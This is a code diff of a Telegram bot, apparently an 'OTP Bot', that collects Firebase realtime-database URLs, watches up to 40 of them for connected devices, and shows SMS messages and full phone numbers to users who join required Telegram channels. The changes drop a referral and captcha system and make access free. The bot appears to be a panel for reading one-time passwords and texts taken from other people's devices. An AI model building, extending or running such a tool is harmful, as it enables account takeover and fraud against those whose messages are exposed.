@@ -1,18 +1,15 @@
 #!/usr/bin/env python3
 """
-Firebase SMS Dashboard Bot — FINAL v2 (Flask Keep-Alive Edition)
+Firebase SMS Dashboard Bot — FREE Edition + Force Join
 - Multi-Firebase (40)
 - AUTO REFRESH every 30s
 - BULK Firebase add (extract URLs from any text)
 - FULL phone number display
-- Force Join + Captcha Verification
-- Referral System (1 refer = 3 hours)
-- Channel leave → referrer access revoke
+- ✅ Force Join Channels (Admin controlled)
+- ❌ No Referral, No Captcha, No Credits
 - Admin unlimited access
-- SMS monitor auto-stop on access revoke
 - SMS monitor idle timeout (10 min no button tap)
-- Admin Gift Access (single user / all users)
-- ⚡ Flask keep-alive server (health check endpoint)
+- ⚡ Flask keep-alive server
 """
 
 import os
@@ -68,32 +65,19 @@ ADMIN_PANEL_EDIT_INTERVAL = 5
 
 ADMIN_DEVICE_REFRESH_INTERVAL = 30
 
-WELCOME_IMAGE_URL = "https://i.ibb.co/CK3s8vzR/Gemini-Generated-Image-en17gcen17gcen17.png"
+WELCOME_IMAGE_URL = "https://i.ibb.co/cKM4HgWZ/file-000000000b5482089195baf993bd9642.png"
 
-REFERRAL_HOURS = 3
-REFERRAL_SECONDS = REFERRAL_HOURS * 3600
-GIFT_ACCESS_MAX_HOURS = 24 * 365
-
-FORCE_JOIN_FILE = os.getenv("FORCE_JOIN_FILE", "force_join_channels.json")
 USER_IDS_FILE = os.getenv("USER_IDS_FILE", "bot_users.json")
 MAINTENANCE_FILE = os.getenv("MAINTENANCE_FILE", "maintenance_mode.json")
 GLOBAL_FB_FILE = os.getenv("GLOBAL_FB_FILE", "global_firebases.json")
 GLOBAL_DEVICE_CACHE_FILE = os.getenv("GLOBAL_DEVICE_CACHE_FILE", "global_devices_cache.json")
-CAPTCHA_STATE_FILE = os.getenv("CAPTCHA_STATE_FILE", "captcha_state.json")
-REFERRAL_DB_FILE = os.getenv("REFERRAL_DB_FILE", "referrals.json")
-
-ACCESS_CHECK_INTERVAL = 30
+FORCE_JOIN_FILE = os.getenv("FORCE_JOIN_FILE", "force_join_channels.json")
 
 # ⚡ Flask config
 FLASK_HOST = os.getenv("FLASK_HOST", "0.0.0.0")
 FLASK_PORT = int(os.getenv("FLASK_PORT", os.getenv("PORT", 8080)))
 
-DEFAULT_CHANNELS = [
-    {"id": "@axxuloots", "label": "@axxuloots", "url": "https://t.me/axxuloots"},
-    {"id": "@KALUASC", "label": "@KALUASC", "url": "https://t.me/KALUASC"},
-    {"id": "@X00MTSxKIDS", "label": "@X00MTSxKIDS", "url": "https://t.me/X00MTSxKIDS"},
-    {"id": "@vishalxupdate", "label": "@vishalxupdate", "url": "https://t.me/vishalxupdate"},
-]
+ACCESS_CHECK_INTERVAL = 30
 
 FIREBASE_URL_REGEX = re.compile(
     r'https?://[A-Za-z0-9\-_.]+(?:-default-rtdb)?(?:\.firebaseio\.com|\.firebasedatabase\.app)(?:/[^\s\'"<>()\[\]{}]*)?',
@@ -113,16 +97,16 @@ def flask_root():
         uptime = int(time.time() - BOT_START_TIME)
         return jsonify({
             "status": "ok",
-            "service": "Firebase SMS Bot",
-            "version": "FINAL v2",
+            "service": "Firebase SMS Bot (FREE + Force Join)",
+            "version": "FREE v2",
             "uptime_seconds": uptime,
             "bot_username": BOT_USERNAME,
             "firebases": len(global_fb_list),
             "users": len(known_users),
+            "force_join_channels": len(REQUIRED_CHANNELS),
             "active_sessions": len(user_sessions),
             "active_sms_monitors": len(sms_monitor_tasks),
             "maintenance_mode": maintenance_mode,
-            "captcha_enabled": captcha_enabled,
             "server_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         }), 200
     except Exception as exc:
@@ -149,13 +133,16 @@ def flask_stats():
             "online_devices": global_device_cache.get("online_count", 0),
             "offline_devices": global_device_cache.get("offline_count", 0),
             "last_refresh": global_device_cache.get("updated_at", ""),
+            "force_join_channels": [
+                {"id": c.get("id"), "label": c.get("label")}
+                for c in REQUIRED_CHANNELS
+            ],
         }), 200
     except Exception as exc:
         return jsonify({"status": "error", "message": str(exc)}), 500
 
 
 def _run_flask():
-    """Flask ko alag daemon thread me chalao — bot ke saath parallel."""
     try:
         logger.info("🌐 Starting Flask keep-alive server on %s:%s", FLASK_HOST, FLASK_PORT)
         flask_app.run(
@@ -170,7 +157,6 @@ def _run_flask():
 
 
 def start_flask_thread():
-    """Start Flask in background daemon thread."""
     t = threading.Thread(target=_run_flask, name="FlaskKeepAlive", daemon=True)
     t.start()
     return t
@@ -179,22 +165,6 @@ def start_flask_thread():
 # ============================================================
 # FILE HELPERS
 # ============================================================
-def _parse_channel_items(raw: str):
-    channels = []
-    for item in raw.split(","):
-        item = item.strip()
-        if not item:
-            continue
-        parts = [part.strip() for part in item.split("|", 2)]
-        identifier = parts[0]
-        label = parts[1] if len(parts) > 1 and parts[1] else identifier
-        join_url = parts[2] if len(parts) > 2 and parts[2] else (
-            f"https://t.me/{identifier.lstrip('@')}"
-            if identifier.startswith("@") else "")
-        channels.append({"id": identifier, "label": label, "url": join_url})
-    return channels
-
-
 def _load_required_channels():
     try:
         with open(FORCE_JOIN_FILE, "r", encoding="utf-8") as fh:
@@ -203,7 +173,7 @@ def _load_required_channels():
             return [item for item in saved if isinstance(item, dict) and item.get("id")]
     except (FileNotFoundError, json.JSONDecodeError, OSError):
         pass
-    return list(DEFAULT_CHANNELS)
+    return []
 
 
 def _save_required_channels():
@@ -248,23 +218,6 @@ def _save_maintenance_mode():
         logger.warning("could not save maintenance mode: %s", exc)
 
 
-def _load_captcha_enabled() -> bool:
-    try:
-        with open(CAPTCHA_STATE_FILE, "r", encoding="utf-8") as fh:
-            saved = json.load(fh)
-        return bool(saved.get("enabled", True)) if isinstance(saved, dict) else True
-    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError):
-        return True
-
-
-def _save_captcha_enabled():
-    try:
-        with open(CAPTCHA_STATE_FILE, "w", encoding="utf-8") as fh:
-            json.dump({"enabled": captcha_enabled}, fh)
-    except OSError as exc:
-        logger.warning("could not save captcha state: %s", exc)
-
-
 def _load_global_firebases():
     try:
         with open(GLOBAL_FB_FILE, "r", encoding="utf-8") as fh:
@@ -304,185 +257,20 @@ def _retag_global_firebases():
 # ============================================================
 REQUIRED_CHANNELS = _load_required_channels()
 maintenance_mode = _load_maintenance_mode()
-captcha_enabled = _load_captcha_enabled()
 global_fb_list = _load_global_firebases()
 _last_refresh_time: float = time.monotonic()
 
 known_users = _load_user_ids()
-user_access_state: Dict[int, bool] = {}
-verified_access_users: Set[int] = set()
-
-_referral_lock = asyncio.Lock()
-
-
-def _load_referral_db() -> Dict[str, dict]:
-    try:
-        with open(REFERRAL_DB_FILE, "r", encoding="utf-8") as fh:
-            data = json.load(fh)
-        if isinstance(data, dict):
-            return data
-    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError):
-        pass
-    return {}
-
-
-def _save_referral_db():
-    try:
-        with open(REFERRAL_DB_FILE, "w", encoding="utf-8") as fh:
-            json.dump(REFERRAL_DB, fh, ensure_ascii=False, indent=2)
-    except OSError as exc:
-        logger.warning("could not save referral db: %s", exc)
-
-
-REFERRAL_DB: Dict[str, dict] = _load_referral_db()
+verified_join_users: Set[int] = set()
 
 _PHONE_PATTERNS = [
     re.compile(r'\b(?:\+91|91|0)?([6-9]\d{9})\b'),
     re.compile(r'\b(?:phone|mobile|number)[\s:]*([6-9]\d{9})\b', re.IGNORECASE),
     re.compile(r'[^0-9]([6-9]\d{9})[^0-9]'),
     re.compile(r'(\+91[-\s]?[6-9][0-9]{9})'),
-    re.compile(r'(?:\b91)([6-9][0-9]{9})\b'),
-    re.compile(r'(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)'),
+    re.compile(r'(?:\b91)([6-9]\d{9})\b'),
+    re.compile(r'(?:^|\s|:)([6-9]\d{9})(?:\s|$|\.)'),
 ]
-
-
-# ============================================================
-# REFERRAL HELPERS
-# ============================================================
-def _ensure_user_record(user_id: int) -> dict:
-    uid = str(user_id)
-    if uid not in REFERRAL_DB:
-        REFERRAL_DB[uid] = {
-            "access_expires_at": 0.0,
-            "referrals": [],
-            "referred_by": None,
-            "referral_count": 0,
-            "expired_notified": False,
-            "cooldown_until": 0.0,
-            "captcha_verified": False,
-        }
-    else:
-        rec = REFERRAL_DB[uid]
-        rec.setdefault("access_expires_at", 0.0)
-        rec.setdefault("referrals", [])
-        rec.setdefault("referred_by", None)
-        rec.setdefault("referral_count", len(rec.get("referrals", [])))
-        rec.setdefault("expired_notified", False)
-        rec.setdefault("cooldown_until", 0.0)
-        rec.setdefault("captcha_verified", False)
-    return REFERRAL_DB[uid]
-
-
-def get_remaining_seconds(user_id: int) -> float:
-    if user_id in ADMIN_IDS:
-        return float('inf')
-    rec = _ensure_user_record(user_id)
-    return max(0.0, rec.get("access_expires_at", 0.0) - time.time())
-
-
-def has_access(user_id: int) -> bool:
-    if user_id in ADMIN_IDS:
-        return True
-    return get_remaining_seconds(user_id) > 0
-
-
-def format_remaining_time(user_id: int) -> str:
-    if user_id in ADMIN_IDS:
-        return "Unlimited ♾️"
-    remaining = get_remaining_seconds(user_id)
-    if remaining <= 0:
-        return "Expired"
-    total_minutes = int(remaining // 60)
-    hours = total_minutes // 60
-    minutes = total_minutes % 60
-    if hours > 0 and minutes > 0:
-        return f"{hours}h {minutes}m"
-    elif hours > 0:
-        return f"{hours}h"
-    return f"{minutes}m"
-
-
-def grant_access(user_id: int, seconds: int):
-    rec = _ensure_user_record(user_id)
-    now = time.time()
-    current = rec.get("access_expires_at", 0.0)
-    if current < now:
-        rec["access_expires_at"] = now + seconds
-    else:
-        rec["access_expires_at"] = current + seconds
-    rec["expired_notified"] = False
-    _save_referral_db()
-
-
-def revoke_access(user_id: int):
-    rec = _ensure_user_record(user_id)
-    rec["access_expires_at"] = 0.0
-    rec["expired_notified"] = False
-    _save_referral_db()
-
-
-async def process_referral(referrer_id: int, referred_id: int) -> dict:
-    async with _referral_lock:
-        if referrer_id == referred_id:
-            return {"success": False, "reason": "self_referral"}
-        if referrer_id in ADMIN_IDS:
-            return {"success": False, "reason": "admin_referrer"}
-        if str(referrer_id) not in REFERRAL_DB:
-            return {"success": False, "reason": "invalid_referrer"}
-        ref_rec = _ensure_user_record(referrer_id)
-        new_rec = _ensure_user_record(referred_id)
-        if new_rec.get("referred_by") is not None:
-            return {"success": False, "reason": "already_referred"}
-        if referred_id in ref_rec.get("referrals", []):
-            return {"success": False, "reason": "duplicate"}
-        now = time.time()
-        current_expiry = ref_rec.get("access_expires_at", 0.0)
-        if current_expiry < now:
-            ref_rec["access_expires_at"] = now + REFERRAL_SECONDS
-        else:
-            ref_rec["access_expires_at"] = current_expiry + REFERRAL_SECONDS
-        ref_rec["expired_notified"] = False
-        ref_rec.setdefault("referrals", []).append(referred_id)
-        ref_rec["referral_count"] = len(ref_rec["referrals"])
-        new_rec["referred_by"] = referrer_id
-        _save_referral_db()
-        return {
-            "success": True,
-            "reason": "ok",
-            "referrer_remaining": format_remaining_time(referrer_id),
-        }
-
-
-async def check_referred_user_left(referred_id: int):
-    try:
-        uid = str(referred_id)
-        if uid not in REFERRAL_DB:
-            return None
-        rec = REFERRAL_DB[uid]
-        referrer_id = rec.get("referred_by")
-        if not referrer_id:
-            return None
-        referrer_uid = str(referrer_id)
-        if referrer_uid not in REFERRAL_DB:
-            return None
-        ref_rec = REFERRAL_DB[referrer_uid]
-        if referred_id not in ref_rec.get("referrals", []):
-            return None
-        ref_rec["referrals"] = [
-            r for r in ref_rec.get("referrals", []) if r != referred_id
-        ]
-        ref_rec["referral_count"] = len(ref_rec["referrals"])
-        revoke_access(referrer_id)
-        rec["referred_by"] = None
-        _save_referral_db()
-        logger.info(
-            "[REFERRAL] User %s left channel → referrer %s access revoked",
-            referred_id, referrer_id
-        )
-        return referrer_id
-    except Exception as exc:
-        logger.error("[REFERRAL] check_referred_user_left error: %s", exc)
-        return None
 
 
 # ============================================================
@@ -1048,20 +836,6 @@ def _is_member_status(status: str) -> bool:
     return status in {"member", "administrator", "creator"}
 
 
-async def get_unjoined_channels(bot, user_id: int) -> List[dict]:
-    unjoined = []
-    if user_id in ADMIN_IDS:
-        return unjoined
-    for channel in REQUIRED_CHANNELS:
-        try:
-            member = await bot.get_chat_member(chat_id=channel["id"], user_id=user_id)
-            if not _is_member_status(member.status):
-                unjoined.append(channel)
-        except Exception:
-            unjoined.append(channel)
-    return unjoined
-
-
 async def check_force_join(bot, user_id: int) -> bool:
     if user_id in ADMIN_IDS:
         return True
@@ -1077,103 +851,53 @@ async def check_force_join(bot, user_id: int) -> bool:
     return True
 
 
-async def _check_required_channels(bot, uid: int):
-    missing = []
+async def get_unjoined_channels(bot, user_id: int) -> List[dict]:
+    unjoined = []
+    if user_id in ADMIN_IDS:
+        return unjoined
     for channel in REQUIRED_CHANNELS:
         try:
-            member = await bot.get_chat_member(chat_id=channel["id"], user_id=uid)
+            member = await bot.get_chat_member(chat_id=channel["id"], user_id=user_id)
             if not _is_member_status(member.status):
-                missing.append(channel["label"])
-        except Exception as exc:
-            logger.warning("force join check failed for %s: %s", channel["id"], exc)
-            missing.append(channel["label"])
-    return not missing, missing
+                unjoined.append(channel)
+        except Exception:
+            unjoined.append(channel)
+    return unjoined
 
 
-def build_dynamic_force_join_keyboard(unjoined_channels: List[dict]) -> InlineKeyboardMarkup:
+def build_force_join_keyboard(unjoined_channels: List[dict]) -> InlineKeyboardMarkup:
     rows: List[List[InlineKeyboardButton]] = []
-    styles = ["danger", "primary", "danger", "primary"]
-    for i, c in enumerate(unjoined_channels):
-        style = styles[i % len(styles)]
+    for c in unjoined_channels:
         try:
             btn = InlineKeyboardButton(
-                text=f"𝗝𝗢𝗜𝗡 {c.get('label','CHANNEL')[:25]}",
+                text=f"📢 𝗝𝗢𝗜𝗡 {c.get('label','CHANNEL')[:28]}",
                 url=c["url"],
-                api_kwargs={"style": style}
+                api_kwargs={"style": "primary"}
             )
         except TypeError:
             btn = InlineKeyboardButton(
-                text=f"𝗝𝗢𝗜𝗡 {c.get('label','CHANNEL')[:25]}", url=c["url"])
+                text=f"📢 𝗝𝗢𝗜𝗡 {c.get('label','CHANNEL')[:28]}", url=c["url"])
         rows.append([btn])
     try:
         check_btn = InlineKeyboardButton(
-            text="✅ 𝗖𝗛𝗘𝗖𝗞 𝗠𝗘𝗠𝗕𝗘𝗥𝗦𝗛𝗜𝗣",
+            text="✅ 𝗩𝗘𝗥𝗜𝗙𝗬 𝗝𝗢𝗜𝗡𝗘𝗗",
             callback_data="force_verify",
             api_kwargs={"style": "success"})
     except TypeError:
         check_btn = InlineKeyboardButton(
-            text="✅ 𝗖𝗛𝗘𝗖𝗞 𝗠𝗘𝗠𝗕𝗘𝗥𝗦𝗛𝗜𝗣", callback_data="force_verify")
+            text="✅ 𝗩𝗘𝗥𝗜𝗙𝗬 𝗝𝗢𝗜𝗡𝗘𝗗", callback_data="force_verify")
     rows.append([check_btn])
-    return InlineKeyboardMarkup(rows)
-
-
-def _force_join_kb():
-    rows = []
-    for channel in REQUIRED_CHANNELS:
-        if channel.get("url"):
-            try:
-                rows.append([InlineKeyboardButton(
-                    f"🔗 𝗝𝗢𝗜𝗡 {channel['label']}",
-                    url=channel["url"],
-                    api_kwargs={"style": "primary"})])
-            except TypeError:
-                rows.append([InlineKeyboardButton(
-                    f"🔗 𝗝𝗢𝗜𝗡 {channel['label']}", url=channel["url"])])
-    rows.append([styled_button("✅ 𝗩𝗘𝗥𝗜𝗙𝗬 𝗝𝗢𝗜𝗡", "force_verify", "success")])
     return InlineKeyboardMarkup(rows)
 
 
 def build_forcejoin_caption(first_name: str = "User") -> str:
     return (
         "🔗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗝𝗢𝗜𝗡 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗\n\n"
-        f"👋 Hi {first_name}!\n\n"
-        "Join all channels below, then tap\n"
-        "✅ 𝗖𝗛𝗘𝗖𝗞 𝗠𝗘𝗠𝗕𝗘𝗥𝗦𝗛𝗜𝗣"
+        f"👋 𝗛𝗶 {first_name}!\n\n"
+        "📌 𝗕𝗼𝘁 𝘂𝘀𝗲 𝗸𝗮𝗿𝗻𝗲 𝘀𝗲 𝗽𝗲𝗵𝗹𝗲 𝗻𝗲𝗲𝗰𝗵𝗲 𝗱𝗶𝘆𝗲 𝗴𝗮𝘆𝗲\n"
+        "𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝘀 𝗷𝗼𝗶𝗻 𝗸𝗮𝗿𝗼 𝗮𝘂𝗿 ✅ 𝗩𝗘𝗥𝗜𝗙𝗬 𝗱𝗮𝗯𝗮𝗼.\n\n"
+        "🎁 𝗔𝗰𝗰𝗲𝘀𝘀 𝗧𝗼𝘁𝗮𝗹𝗹𝘆 𝗙𝗥𝗘𝗘 𝗵𝗮𝗶!"
     )
-
-
-def build_welcome_caption_joined(first_name: str, user_id: int) -> str:
-    safe_name = (first_name or "User").strip()
-    refer_link = f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"
-
-    if user_id in ADMIN_IDS:
-        remaining = "Unlimited ♾️"
-    else:
-        remaining = format_remaining_time(user_id)
-
-    rec = _ensure_user_record(user_id)
-    ref_count = rec.get("referral_count", 0)
-
-    return (
-        f"🌸 𝗛𝗶𝗶 {safe_name} ⚡\n\n"
-        "🚀 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗢𝗧𝗣 𝗕𝗼𝘁 ✴️\n\n"
-        f"⏳ 𝗔𝗖𝗖𝗘𝗦𝗦 : {remaining}\n\n"
-        f"🔗 𝗬𝗢𝗨𝗥 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 𝗟𝗜𝗡𝗞 :\n<code>{refer_link}</code>\n\n"
-        f"📊 𝗧𝗢𝗧𝗔𝗟 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟𝗦 : {ref_count}\n\n"
-        "🎁 𝟭 𝗥𝗘𝗙𝗘𝗥 = 𝟯 𝗛𝗢𝗨𝗥𝗦 𝗔𝗖𝗖𝗘𝗦𝗦\n\n"
-        "👇 𝗧𝗮𝗽 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝘀𝘁𝗮𝗿𝘁"
-    )
-
-
-# ============================================================
-# CAPTCHA
-# ============================================================
-def _new_math_captcha():
-    a = random.randint(2, 20)
-    b = random.randint(2, 20)
-    op = random.choice(("+", "-", "×"))
-    answer = a + b if op == "+" else a - b if op == "-" else a * b
-    return f"{a} {op} {b}", answer
 
 
 # ============================================================
@@ -1181,7 +905,7 @@ def _new_math_captcha():
 # ============================================================
 async def send_welcome_photo(chat_id: int, first_name: str, *,
                               user_id: int = 0,
-                              show_force_join: bool,
+                              show_force_join: bool = False,
                               reply_markup=None, bot=None):
     try:
         if show_force_join:
@@ -1215,7 +939,21 @@ async def send_welcome_photo(chat_id: int, first_name: str, *,
 
 
 # ============================================================
-# ACCESS MIDDLEWARE
+# WELCOME CAPTION
+# ============================================================
+def build_welcome_caption_joined(first_name: str, user_id: int) -> str:
+    safe_name = (first_name or "User").strip()
+    return (
+        f"🌸 𝗛𝗶𝗶 {safe_name} ⚡\n\n"
+        "🚀 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗢𝗧𝗣 𝗕𝗼𝘁 ✴️\n\n"
+        "🎉 𝗧𝗢𝗧𝗔𝗟𝗟𝗬 𝗙𝗥𝗘𝗘 𝗕𝗢𝗧\n"
+        "🎁 𝗡𝗼 𝗥𝗲𝗳𝗲𝗿, 𝗡𝗼 𝗖𝗿𝗲𝗱𝗶𝘁𝘀\n\n"
+        "👇 𝗧𝗮𝗽 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝘀𝘁𝗮𝗿𝘁"
+    )
+
+
+# ============================================================
+# ACCESS MIDDLEWARE (Force Join + Maintenance)
 # ============================================================
 async def _require_access(update: Update, context: ContextTypes.DEFAULT_TYPE,
                           *, edit_target=None):
@@ -1241,79 +979,38 @@ async def _require_access(update: Update, context: ContextTypes.DEFAULT_TYPE,
                 pass
         return False
 
+    # Force Join Check
     if REQUIRED_CHANNELS and uid not in ADMIN_IDS:
         joined = await check_force_join(context.bot, uid)
-        user_access_state[uid] = joined
         if not joined:
-            verified_access_users.discard(uid)
-            context.user_data.pop("force_join_captcha", None)
-            context.user_data.pop("force_join_verified", None)
+            verified_join_users.discard(uid)
             unjoined = await get_unjoined_channels(context.bot, uid)
-            kb = build_dynamic_force_join_keyboard(unjoined)
+            kb = build_force_join_keyboard(unjoined)
             caption = build_forcejoin_caption(user.first_name or "User")
-            if edit_target is not None and update.callback_query:
-                try:
-                    await update.callback_query.edit_message_caption(
-                        caption=_bold_blockquote(caption),
-                        parse_mode="HTML", reply_markup=kb)
-                    return False
-                except Exception:
-                    pass
-            chat_id = (update.effective_chat.id if update.effective_chat
-                       else update.callback_query.message.chat_id)
-            await send_welcome_photo(
-                chat_id=chat_id, first_name=user.first_name or "User",
-                user_id=uid, show_force_join=True,
-                reply_markup=kb, bot=context.bot)
-            return False
-
-        if (captcha_enabled and uid not in ADMIN_IDS
-                and uid not in verified_access_users
-                and not context.user_data.get("force_join_verified")):
-            question, answer = _new_math_captcha()
-            context.user_data["force_join_captcha"] = answer
-            captcha_text = _bold_blockquote(
-                f"🔐 𝗩𝗘𝗥𝗜𝗙𝗬 𝗖𝗔𝗣𝗧𝗖𝗛𝗔\n\n🧮 Solve: {question} = ?")
+            # Try editing existing message first
             if edit_target is not None and update.callback_query:
                 try:
                     cq = update.callback_query
                     if getattr(cq.message, "photo", None):
-                        await cq.edit_message_caption(caption=captcha_text, parse_mode="HTML")
+                        await cq.edit_message_caption(
+                            caption=_bold_blockquote(caption),
+                            parse_mode="HTML", reply_markup=kb)
                     else:
-                        await cq.edit_message_text(captcha_text, parse_mode="HTML")
+                        await cq.edit_message_text(
+                            text=_bold_blockquote(caption),
+                            parse_mode="HTML", reply_markup=kb)
                     return False
                 except Exception:
                     pass
             chat_id = (update.effective_chat.id if update.effective_chat
-                       else update.callback_query.message.chat_id)
-            await context.bot.send_message(
-                chat_id=chat_id, text=captcha_text, parse_mode="HTML")
+                       else update.callback_query.message.chat_id
+                       if update.callback_query else None)
+            if chat_id:
+                await send_welcome_photo(
+                    chat_id=chat_id, first_name=user.first_name or "User",
+                    user_id=uid, show_force_join=True,
+                    reply_markup=kb, bot=context.bot)
             return False
-
-    if uid not in ADMIN_IDS and not has_access(uid):
-        access_msg = _bold_blockquote(
-            "⚠️ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗥𝗘𝗦𝗧𝗥𝗜𝗖𝗧𝗘𝗗\n\n"
-            "🔒 𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱.\n\n"
-            "🎁 𝟭 𝗥𝗘𝗙𝗘𝗥 = 𝟯 𝗛𝗢𝗨𝗥𝗦 𝗔𝗖𝗖𝗘𝗦𝗦\n\n"
-            "🔗 𝗬𝗢𝗨𝗥 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 𝗟𝗜𝗡𝗞 :\n"
-            f"<code>https://t.me/{BOT_USERNAME}?start=ref_{uid}</code>\n\n"
-            "📌 𝗦𝗵𝗮𝗿𝗲 𝘁𝗵𝗶𝘀 𝗹𝗶𝗻𝗸 𝘄𝗶𝘁𝗵 𝗳𝗿𝗶𝗲𝗻𝗱𝘀 𝘁𝗼 𝗴𝗲𝘁 𝗮𝗰𝗰𝗲𝘀𝘀!")
-        if edit_target is not None and update.callback_query:
-            try:
-                cq = update.callback_query
-                if getattr(cq.message, "photo", None):
-                    await cq.edit_message_caption(caption=access_msg, parse_mode="HTML")
-                else:
-                    await cq.edit_message_text(access_msg, parse_mode="HTML")
-                return False
-            except Exception:
-                pass
-        if update.effective_message:
-            try:
-                await update.effective_message.reply_text(access_msg, parse_mode="HTML")
-            except Exception:
-                pass
-        return False
 
     return True
 
@@ -1337,39 +1034,27 @@ async def force_verify_callback(update: Update, context: ContextTypes.DEFAULT_TY
         return
 
     joined = await check_force_join(context.bot, uid)
-    user_access_state[uid] = joined
 
     if joined:
-        verified_access_users.discard(uid)
-        context.user_data.pop("force_join_captcha", None)
-        context.user_data.pop("force_join_verified", None)
+        verified_join_users.add(uid)
         try:
-            await q.answer("✅ All channels joined!")
+            await q.answer("✅ Verified! Access Granted")
         except Exception:
             pass
+        # Try edit as caption first (photo message)
         try:
             await q.message.delete()
         except Exception:
             pass
-        if captcha_enabled and uid not in ADMIN_IDS:
-            question, answer = _new_math_captcha()
-            context.user_data["force_join_captcha"] = answer
-            await context.bot.send_message(
-                chat_id=q.message.chat_id,
-                text=_bold_blockquote(
-                    f"🔐 𝗩𝗘𝗥𝗜𝗙𝗬 𝗖𝗔𝗣𝗧𝗖𝗛𝗔\n\n🧮 Solve: {question} = ?"),
-                parse_mode="HTML")
-        else:
-            await _send_main_menu(context, q.message.chat_id, first_name, uid)
+        await _send_main_menu(context, q.message.chat_id, first_name, uid)
     else:
-        verified_access_users.discard(uid)
-        context.user_data.pop("force_join_captcha", None)
+        verified_join_users.discard(uid)
         unjoined = await get_unjoined_channels(context.bot, uid)
         try:
-            await q.answer("❌ Join all channels first!", show_alert=True)
+            await q.answer("❌ Pehle saare channels join karo!", show_alert=True)
         except Exception:
             pass
-        kb = build_dynamic_force_join_keyboard(unjoined)
+        kb = build_force_join_keyboard(unjoined)
         try:
             await q.message.delete()
         except Exception:
@@ -1497,25 +1182,15 @@ def _format_time(ts_key) -> str:
 # ============================================================
 def admin_panel_kb():
     maintenance_label = "🟢 TURN BOT ON" if maintenance_mode else "🔴 TURN BOT OFF"
-    captcha_label = "🔐 CAPTCHA ON" if captcha_enabled else "🔓 CAPTCHA OFF"
+    channel_count = len(REQUIRED_CHANNELS)
     return InlineKeyboardMarkup([
         [styled_button("➕ ADD FIREBASE", "admin_add_firebase", "success")],
         [styled_button("📋 MANAGE FIREBASES", "admin_manage_fb", "primary")],
         [styled_button("📊 BOT STATISTICS", "admin_stats", "primary")],
-        [styled_button("🎁 GIFT ACCESS", "admin_gift_access", "success")],
         [styled_button("📢 BROADCAST", "admin_broadcast", "success")],
+        [styled_button(f"➕ ADD JOIN CHANNEL ({channel_count})", "admin_add_channel", "success")],
+        [styled_button("📋 MANAGE CHANNELS", "admin_channels", "primary")],
         [styled_button(maintenance_label, "admin_toggle_maintenance", "danger")],
-        [styled_button(captcha_label, "admin_toggle_captcha", "primary")],
-        [styled_button("➕ ADD FORCE JOIN CHANNEL", "admin_add_channel", "success")],
-        [styled_button("📋 FORCE JOIN CHANNELS", "admin_channels", "primary")],
-    ])
-
-
-def admin_gift_kb():
-    return InlineKeyboardMarkup([
-        [styled_button("👤 GIFT SINGLE USER", "admin_gift_single", "primary")],
-        [styled_button("👥 GIFT ALL USERS", "admin_gift_all", "success")],
-        [styled_button("🔙 ADMIN PANEL", "admin_back", "danger")],
     ])
 
 
@@ -1543,11 +1218,14 @@ def admin_back_kb():
 
 def admin_channels_kb():
     rows = []
-    for index, channel in enumerate(REQUIRED_CHANNELS):
-        rows.append([styled_button(
-            f"🗑 REMOVE {channel.get('label', channel.get('id', '?'))[:35]}",
-            f"admin_remove_channel:{index}", "danger")])
-    rows.append([styled_button("➕ ADD CHANNEL", "admin_add_channel", "success")])
+    if not REQUIRED_CHANNELS:
+        rows.append([styled_button("➕ ADD CHANNEL", "admin_add_channel", "success")])
+    else:
+        for index, channel in enumerate(REQUIRED_CHANNELS):
+            rows.append([styled_button(
+                f"🗑 REMOVE {channel.get('label', channel.get('id', '?'))[:35]}",
+                f"admin_remove_channel:{index}", "danger")])
+        rows.append([styled_button("➕ ADD CHANNEL", "admin_add_channel", "success")])
     rows.append([styled_button("🔙 ADMIN PANEL", "admin_back", "primary")])
     return InlineKeyboardMarkup(rows)
 
@@ -1798,36 +1476,10 @@ async def _show_device_view(q, sess, device_id: str):
 async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     first_name = update.effective_user.first_name or "User"
-    username = update.effective_user.username or str(uid)
 
     if uid not in known_users:
         known_users.add(uid)
         _save_user_ids()
-
-    _ensure_user_record(uid)
-    context.user_data.pop("force_join_captcha", None)
-    context.user_data.pop("force_join_verified", None)
-
-    if update.message and update.message.text and " " in update.message.text:
-        parts = update.message.text.split(maxsplit=1)
-        if len(parts) > 1 and parts[1].startswith("ref_"):
-            try:
-                referrer_id = int(parts[1][4:])
-                result = await process_referral(referrer_id, uid)
-                if result["success"]:
-                    try:
-                        ref_msg = _bold_blockquote(
-                            "🎉 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 𝗦𝗨𝗖𝗖𝗘𝗦𝗦\n\n"
-                            f"👤 @{username} 𝗝𝗢𝗜𝗡𝗘𝗗 𝗨𝗦𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗟𝗜𝗡𝗞\n\n"
-                            "⏳ +𝟯 𝗛𝗢𝗨𝗥𝗦 𝗔𝗖𝗖𝗘𝗦𝗦 𝗔𝗗𝗗𝗘𝗗\n"
-                            f"📊 𝗔𝗖𝗖𝗘𝗦𝗦 : {result.get('referrer_remaining', 'N/A')}")
-                        await context.bot.send_message(
-                            chat_id=referrer_id, text=ref_msg, parse_mode="HTML")
-                    except Exception as exc:
-                        logger.exception(
-                            f"[REFERRAL] notification failed: referrer={referrer_id}, err={exc}")
-            except (ValueError, TypeError):
-                pass
 
     if not await _require_access(update, context):
         return
@@ -1986,40 +1638,6 @@ async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
